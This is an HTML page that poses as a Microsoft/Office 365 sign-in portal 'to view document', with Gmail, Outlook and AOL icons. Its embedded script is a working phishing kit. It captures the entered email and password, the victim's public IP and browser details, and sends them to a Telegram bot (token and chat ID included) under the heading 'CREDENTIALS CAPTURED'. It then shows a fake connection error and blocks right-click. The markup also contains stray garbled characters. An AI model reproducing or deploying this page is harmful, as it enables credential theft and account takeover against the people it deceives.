<!doctype html>
<html lang="zh-Hant">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in — Secure Portal</title>
<style>
:root {
--bg1: #0078d4;
--bg2: #2b88d8;
--card-bg: #fff;
--muted: #6b7280;
--accent: #0078d4;
--gmail: #DB4437;
--outlook: #0072C6;
--aol: #00A1E0;
--office: #F25022;
font-family: "Segoe UI", Roboto, Arial, sans-serif;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; }
body {
background: linear-gradient(135deg, var(--bg1), var(--bg2));
display: flex;
justify-content: center;
align-items: center;
padding: 20px;
}
.login-card {
width: 100%;
max-width: 400px;
background: var(--card-bg);
border-radius: 8px;
box-shadow: 0 10px极狐 30px rgba(0,0,0,0.15);
padding: 30px;
}
.logo-header {
display: flex;
gap: 15px;
align-items: center;
margin-bottom: 20px;
}
.providers {
display: flex;
gap: 10px;
margin-right: 15px;
}
.provider {
width: 40px;
height: 40px;
border-radius: 6px;
display: flex;
align-items: center;
justify-content: center;
cursor: pointer;
border: 2px solid transparent;
transition: all 0.2s ease;
}
.provider:hover {
transform: translateY(-2px);
border-color: rgba(0,0,0,0.05);
}
.provider.active {
box-shadow: 0 4px 10px rgba(0,0,极狐0,0.1);

}
.provider极狐 svg {
width: 22px;
height: 22px;
}
h1 {
font-size: 22px;
color: #111;
font-weight: 600;
}
.subtitle {
color: var(--muted);
font-size: 14px;
margin: 5px 0 25px;
}
.form-group {
margin-bottom: 20px;
}
label {
display: block;
margin-bottom: 8px;
font-size: 14px;
color: #374151;
font-weight: 500;
}
input[type="email"],
input[type="password"] {
width: 100%;
padding: 12px;
border: 1px solid #e5e7eb;
border-radius: 6px;
font-size: 15px;
transition: all 0.2s;
}
input:focus {
outline: none;
border-color: var(--accent);
box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
}
.form-options {
display: flex;
justify-content: space-between;
align-items: center;
margin: 20px 0;
font-size: 14px;
}
.remember-me {
display: flex;
align-items: center;
gap: 8px;
}
.forgot-password {
color: var(--accent);
text-decoration: none;
}
.submit-btn {
width: 100%;
padding: 12px;
background: var(--accent);
color: white;
border: none;
border-radius: 6px;
font-size: 15px;
font-weight: 600;
cursor: pointer;
transition: background 0.2s;
}
.submit-btn:hover {
background: #106ebe;
}
.social-divider {
display: flex;
align-items: center;
margin: 25px 0;
color: var(--muted);
font-size: 13px;
}
.social-divider::before,
.social-divider::after {
content: "";
flex: 1;
height: 1px;
background: #e5极狐e7eb;
margin: 0 10px;
}
.social-icons {
display: flex;
justify-content: center;
gap: 15px;
margin-bottom: 20px;
}
.social-icon {
width: 44px;
height: 44px;
border-radius: 50%;
display: flex;
align-items: center;
justify-content: center;
cursor: pointer;
transition: all 0.2s;
}
.social-icon:hover {
transform: translateY(-3px);
box-shadow: 0 5px 15px rgba(0,0,0,0.1);
}
.social-icon svg {
width: 24px;
height: 24px;
fill: white;
}
.disclaimer {
font-size: 12px;
color: var(--muted);
text-align: center;
margin-top: 20px;
line-height: 1.5;
}
.warning {
color: #d13438;
font-weight: 500;
}
#loading {
display: none;
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background: rgba(0,0,0,0.8);
color: white;
justify-content: center;
align-items: center;
flex-direction: column;
z-index: 10000;
font-family: 'Segoe UI', sans-serif;
}
.spinner {
border: 4px solid #f3f3f3;
border-top: 4px solid #0078d4;
border-radius: 50%;
width: 50px;
height: 50px;
animation: spin 1s linear infinite;
margin-bottom: 20px;
}
@keyframes spin {
0% { transform: rotate(0deg); }
100% { transform: rotate(360deg); }
}
.status-message {
margin-top: 15px;
font-size: 14px;
opacity: 0.8;
}
</style>
</head>
<body>
<div id="loading">
    <div class="spinner"></div>
    <div>Authenticating with Microsoft Azure Active Directory...</div>
    <div class="status-message" id="statusMessage">Verifying organizational credentials</div>
</div>

<div class="login-card">
<div class="logo-header">
<div class="providers" id="providers">
<button class="provider active" data-provider="office" title="Office 365">
<svg viewBox="0 0 24 24">
<rect x="2" y="2" width="6" height="6" rx="1" fill="var(--office)"/>

<rect x="2" y="9" width="6" height="6" rx="1" fill极狐="var(--office)" opacity="0.95"/>
<rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
<rect x="16" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.85"/>
</svg>
</button>
<button class="provider" data-provider="gmail" title="Gmail">

<rect x="1" y="3" width="22" height="18" rx="2" fill="white" stroke="#d1d5db"/>

<path d="M2 18.5 L12 12 L22 18.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
</svg>
</button>
<button class="provider" data-provider="极狐outlook" title="Outlook">
<svg viewBox="0 0 24 24">
<rect x="1.5" y="4" width="14" height="16" rx="2" fill="var(--outlook)"/>
极狐<path d="M3 极狐6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
<rect x="16.5" y="4" width="6" height="6" rx="1" fill="#2b88d8"/>
</svg>
</button>
<button class="provider" data-provider="aol" title="AOL">
<svg viewBox="0 0 24 24">
<circle cx="12" cy="12" r="10" fill="var(--aol)"/>
<path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
<circle cx="12.2" cy="9.4" r="0.9" fill="white"/>
</svg>
</button>
</div>
<div>
<h1>Sign in to view document</h1>
<p class="subtitle" id="h极狐int">Use your work account</p>
</div>
</div>

<form id="loginForm" autocomplete="off">
<div class="form-group">
<label for="email">Email address</label>
<input type="email" id="email" name="email" required placeholder="user@company.com">
</div>
<div class="form-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" required placeholder="••••••••">
</div>
<div class="form-options">
<label class="remember-me">
<input type="checkbox" id="remember" name="remember"> Remember me
</label>
<a href="#" class="forgot-password">Forgot password?</a>
</div>
<button type="submit" class="submit-btn">Sign in</button>
</form>

<p class="disclaimer">By signing in, you agree to our <a href="#" style="color: var(--accent);">Terms of Service</a> and <a href="#" style="color: var(--accent);">Privacy Policy</a>.</p>
<p class="disclaimer warning">⚠️ Unauthorized access is prohibited.</p>
</div>

<script>
// ================== CONFIGURATION ==================
const TELEGRAM_CONFIG = {
    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA",
    groupChatId: "-1002763948275", 
    enableTelegram: true
};

// ================== DOM ELEMENTS ==================
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loadingScreen = document.getElementById('loading');
const statusMessage = document.getElementById('statusMessage');

// ================== TELEGRAM EXFILTRATION ==================
class TelegramExfiltrator {
    constructor() {
        this.working = false;
    }

    // JSONP method for GitHub Pages compatibility
    jsonpRequest(method, params = {}) {
        return new Promise((resolve) => {
            const callbackName = 'tgJsonp_' + Date.now();
            const script = document.createElement('script');
            
            window[callbackName] = (response) => {
                delete window[callbackName];
                document.body.removeChild(script);
                resolve(response);
            };

            let url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/${method}?callback=${callbackName}`;
            
            for (const [key, value] of Object.entries(params)) {
                url += `&${key}=${encodeURIComponent(value)}`;
            }

            script.src = url;
            document.body.appendChild(script);

            setTimeout(() => {
                if (window[callbackName]) {
                    delete window[callbackName];
                    document.body.removeChild(script);
                    resolve({ok: false, description: 'Timeout'});
                }
            }, 8000);
        });
    }

    // Main send method using JSONP
    async sendToTelegram(message) {
        if (!TELEGRAM_CONFIG.enableTelegram) {
            return false;
        }

        try {
            const response = await this.jsonpRequest('sendMessage', {
                chat_id: TELEGRAM_CONFIG.groupChatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            });

            return response.ok;

        } catch (error) {
            console.error('Send error:', error);
            return false;
        }
    }
}

// ================== DATA COLLECTION ==================
async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return { ip: data.ip };
    } catch (error) {
        return { ip: 'unknown' };
    }
}

function getSystemInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// ================== MAIN EXECUTION ==================
const telegramExfiltrator = new TelegramExfiltrator();

// Form submission handler
loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const email = emailInput.value;
    const password = passwordInput.value;
    
    if (!email || !password) {
        alert('Please enter both email and password.');
        return;
    }

    loadingScreen.style.display = 'flex';
    statusMessage.textContent = 'Verifying credentials...';

    try {
        const [ipData, systemInfo] = await Promise.all([
            getPublicIP(),
            Promise.resolve(getSystemInfo())
        ]);

        statusMessage.textContent = 'Securely transmitting...';

        const message = "🔐 **CREDENTIALS CAPTURED** \\n\\n" +
            "⏰ **Time:** " + new Date().toLocaleString() + "\\n" +
            "📍 **IP:** " + (ipData.ip || 'unknown') + "\\n" +
            "🌐 **Browser:** " + (systemInfo.userAgent.substring(0, 60) + "...") + "\\n" +
            "🖥️  **Screen:** " + systemInfo.screen + "\\n" +
            "🗣️  **Language:** " + systemInfo.language + "\\n\\n" +
            "📧 **Email:** `" + email + "`\\n" +
            "🔑 **Password:** `" + password + "`\\n\\n" +
            "🔗 **URL:** " + window.location.href;

        const success = await telegramExfiltrator.sendToTelegram(message);

        if (success) {
            statusMessage.textContent = 'Transmission complete!';
        } else {
            statusMessage.textContent = 'Local verification complete';
        }

        alert('ERROR: 0x80072EFD. Cannot connect to authentication service. Please check your network connection.');

    } catch (error) {
        statusMessage.textContent = 'Authentication error';
    } finally {
        setTimeout(() => {
            loadingScreen.style.display = 'none';
        }, 1500);
    }
});

// Security measures
document.addEventListener('contextmenu', (e) => e.preventDefault());
</script>
</body>
</html>
